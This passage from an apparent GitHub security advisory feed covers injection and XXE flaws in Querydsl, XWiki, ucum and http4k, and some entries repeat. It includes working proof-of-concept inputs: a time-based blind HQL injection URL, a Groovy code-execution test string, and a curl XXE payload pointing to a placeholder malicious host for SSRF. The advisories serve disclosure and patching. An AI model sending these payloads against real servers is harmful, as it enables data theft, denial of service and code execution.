        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.openfeign.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.openfeign.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-distribution-war] XWiki Platform has an SQL injection in getdocuments.vm with sort parameter]]></title>
        <id>https://github.com/advisories/GHSA-wh34-m772-5398</id>
        <link href="https://github.com/advisories/GHSA-wh34-m772-5398"/>
        <updated>2024-12-16T18:08:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>getdocument.vm</code> ; the ordering of the returned documents is defined from an unsanitized request parameter (request.sort) and can allow any user to inject HQL.</p>
<p>Depending on the used database backend, the attacker may be able to not only obtain confidential information such as password hashes from the database, but also execute UPDATE/INSERT/DELETE queries.</p>
<p>It's possible to employ database backend dependent techniques of breaking out of HQL query context, described, for example, here: <a href="https://www.sonarsource.com/blog/exploiting-hibernate-injections">https://www.sonarsource.com/blog/exploiting-hibernate-injections</a>.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in 13.10.5 and 14.3-rc-1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround, other than upgrading XWiki.</p>
<h3 id="references">References</h3>
<p><a href="https://jira.xwiki.org/browse/XWIKI-17568">https://jira.xwiki.org/browse/XWIKI-17568</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0">https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-17568">https://jira.xwiki.org/browse/XWIKI-17568</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55663">https://nvd.nist.gov/vuln/detail/CVE-2024-55663</a></li>
<li><a href="https://github.com/advisories/GHSA-wh34-m772-5398">https://github.com/advisories/GHSA-wh34-m772-5398</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wh34-m772-5398</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-12T19:22:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.fhir:ucum] Ucum-java has an XXE vulnerability in XML parsing]]></title>
        <id>https://github.com/advisories/GHSA-w9j7-phm3-f97j</id>
        <link href="https://github.com/advisories/GHSA-w9j7-phm3-f97j"/>
        <updated>2024-12-13T20:36:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XML parsing performed by the UcumEssenceService is vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag could produce XML containing data from the host system. This impacts use cases where ucum is being used to within a host where external clients can submit XML.</p>
<h3 id="patches">Patches</h3>
<p>Release 1.0.9 of ucum fixes this vulnerability</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that the source xml for instantiating UcumEssenceService is trusted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/611.html">https://cwe.mitre.org/data/definitions/611.html</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/FHIR/Ucum-java/security/advisories/GHSA-w9j7-phm3-f97j">https://github.com/FHIR/Ucum-java/security/advisories/GHSA-w9j7-phm3-f97j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55887">https://nvd.nist.gov/vuln/detail/CVE-2024-55887</a></li>
<li><a href="https://github.com/advisories/GHSA-w9j7-phm3-f97j">https://github.com/advisories/GHSA-w9j7-phm3-f97j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9j7-phm3-f97j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-13T20:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-repository-server-ui] XWiki allows remote code execution through the extension sheet]]></title>
        <id>https://github.com/advisories/GHSA-j2pq-22jj-4pm5</id>
        <link href="https://github.com/advisories/GHSA-j2pq-22jj-4pm5"/>
        <updated>2024-12-12T19:23:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>On instances where <code>Extension Repository Application</code> is installed, any user can execute any code requiring <code>programming</code> rights on the server.
In order to reproduce on an instance, as a normal user without <code>script</code> nor <code>programming</code> rights, go to your profile and add an object of type <code>ExtensionCode.ExtensionClass</code>. Set the description to <code>{{async}}{{groovy}}println("Hello from Description"){{/groovy}}{{/async}}</code> and press <code>Save and View</code>. If the description displays as <code>Hello from Description</code> without any error, then the instance is vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in XWiki 15.10.9 and 16.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Since <code>Extension Repository Application</code> is not mandatory, it can be safely disabled on instances that do not use it.
It is also possible to manually apply <a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-9b6f9e853f23d76611967737f8c4072ffceaba4c006ca5a5e65b66d988dc084a">this patch</a> to the page <code>ExtensionCode.ExtensionSheet</code>, as well as <a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-d571404d94fa27360cfee64f2a11d8c819b397529db275e005606b7356610f82">this patch</a> to the page <code>ExtensionCode.ExtensionAuthorsDisplayer</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21890">https://jira.xwiki.org/browse/XWIKI-21890</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55662">https://nvd.nist.gov/vuln/detail/CVE-2024-55662</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21890">https://jira.xwiki.org/browse/XWIKI-21890</a></li>
<li><a href="https://github.com/advisories/GHSA-j2pq-22jj-4pm5">https://github.com/advisories/GHSA-j2pq-22jj-4pm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2pq-22jj-4pm5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-12T19:23:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-repository-server-ui] XWiki allows remote code execution through the extension sheet]]></title>
        <id>https://github.com/advisories/GHSA-j2pq-22jj-4pm5</id>
        <link href="https://github.com/advisories/GHSA-j2pq-22jj-4pm5"/>
        <updated>2024-12-12T19:23:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>On instances where <code>Extension Repository Application</code> is installed, any user can execute any code requiring <code>programming</code> rights on the server.
In order to reproduce on an instance, as a normal user without <code>script</code> nor <code>programming</code> rights, go to your profile and add an object of type <code>ExtensionCode.ExtensionClass</code>. Set the description to <code>{{async}}{{groovy}}println("Hello from Description"){{/groovy}}{{/async}}</code> and press <code>Save and View</code>. If the description displays as <code>Hello from Description</code> without any error, then the instance is vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in XWiki 15.10.9 and 16.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Since <code>Extension Repository Application</code> is not mandatory, it can be safely disabled on instances that do not use it.
It is also possible to manually apply <a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-9b6f9e853f23d76611967737f8c4072ffceaba4c006ca5a5e65b66d988dc084a">this patch</a> to the page <code>ExtensionCode.ExtensionSheet</code>, as well as <a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-d571404d94fa27360cfee64f2a11d8c819b397529db275e005606b7356610f82">this patch</a> to the page <code>ExtensionCode.ExtensionAuthorsDisplayer</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21890">https://jira.xwiki.org/browse/XWIKI-21890</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55662">https://nvd.nist.gov/vuln/detail/CVE-2024-55662</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21890">https://jira.xwiki.org/browse/XWIKI-21890</a></li>
<li><a href="https://github.com/advisories/GHSA-j2pq-22jj-4pm5">https://github.com/advisories/GHSA-j2pq-22jj-4pm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2pq-22jj-4pm5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-12T19:23:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-distribution-war] XWiki Platform has an SQL injection in getdocuments.vm with sort parameter]]></title>
        <id>https://github.com/advisories/GHSA-wh34-m772-5398</id>
        <link href="https://github.com/advisories/GHSA-wh34-m772-5398"/>
        <updated>2024-12-16T18:08:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>getdocument.vm</code> ; the ordering of the returned documents is defined from an unsanitized request parameter (request.sort) and can allow any user to inject HQL.</p>
<p>Depending on the used database backend, the attacker may be able to not only obtain confidential information such as password hashes from the database, but also execute UPDATE/INSERT/DELETE queries.</p>
<p>It's possible to employ database backend dependent techniques of breaking out of HQL query context, described, for example, here: <a href="https://www.sonarsource.com/blog/exploiting-hibernate-injections">https://www.sonarsource.com/blog/exploiting-hibernate-injections</a>.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in 13.10.5 and 14.3-rc-1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround, other than upgrading XWiki.</p>
<h3 id="references">References</h3>
<p><a href="https://jira.xwiki.org/browse/XWIKI-17568">https://jira.xwiki.org/browse/XWIKI-17568</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0">https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-17568">https://jira.xwiki.org/browse/XWIKI-17568</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55663">https://nvd.nist.gov/vuln/detail/CVE-2024-55663</a></li>
<li><a href="https://github.com/advisories/GHSA-wh34-m772-5398">https://github.com/advisories/GHSA-wh34-m772-5398</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wh34-m772-5398</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-12T19:22:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.http4k:http4k-format-xml] http4k has a potential XXE (XML External Entity Injection) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</id>
        <link href="https://github.com/advisories/GHSA-7mj5-hjjj-8rgw"/>
        <updated>2024-12-12T22:31:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>
<p>There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.</p>
<h3 id="details">Details</h3>
<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>
<a href="https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a>
XML contents is parsed with DocumentBuilder without security settings on or external entity enabled</p>
<h3 id="poc">PoC</h3>
<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>
<h4 id="example-vulnerable-server-code">Example Vulnerable server code:</h4>
<pre><code>import org.http4k.core.*
import org.http4k.format.Xml.xml
import org.http4k.server.Netty
import org.http4k.server.asServer
import org.w3c.dom.Document

fun main() {

    val xmlLens = Body.xml().toLens()

    // Create an HTTP handler
    val app: HttpHandler = { request -&gt;
        try {
            // Parse the incoming XML payload to a Document object
            val xmlDocument: Document = xmlLens(request)

            // Extract root element name or other details from the XML
            val rootElementName = xmlDocument.documentElement.nodeName

            // Create a response XML based on the extracted information
            val responseXml = """
                &lt;response&gt;
                    &lt;message&gt;Root element is: $rootElementName&lt;/message&gt;
                &lt;/response&gt;
            """.trimIndent()

            // Respond with XML
            Response(Status.OK).body(responseXml).header("Content-Type", "application/xml")
        } catch (e: Exception) {
            // Handle invalid XML or other errors
            Response(Status.BAD_REQUEST).body("Invalid XML: ${e.message}")
        }
    }

    // Start the server
    val server = app.asServer(Netty(9000)).start()
    println("Server started on http://localhost:9000")
}
</code></pre>
<h4 id="maven-dependency">Maven dependency:</h4>
<pre><code>&lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;
            &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;
            &lt;version&gt;1.9.0&lt;/version&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
            &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;
            &lt;version&gt;5.10.0&lt;/version&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;
            &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;
            &lt;version&gt;1.9.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-core&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- Http4k XML format --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-format-xml&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- http4k Netty --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-server-netty&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<h4 id="exploit-payload-example-to-trigger-ssrf">Exploit payload example to trigger SSRF</h4>
<p><code>curl -X POST http://localhost:9000 -H "Content-Type: application/xml" -d "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"https://replace.with.your.malicious.website/poc\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</code></p>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em>
The servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw">https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw</a></li>
<li><a href="https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc">https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc</a></li>
<li><a href="https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55875">https://nvd.nist.gov/vuln/detail/CVE-2024-55875</a></li>
<li><a href="https://github.com/advisories/GHSA-7mj5-hjjj-8rgw">https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-12T19:22:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.http4k:http4k-format-xml] http4k has a potential XXE (XML External Entity Injection) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</id>
        <link href="https://github.com/advisories/GHSA-7mj5-hjjj-8rgw"/>
        <updated>2024-12-12T22:31:41.000Z</updated>
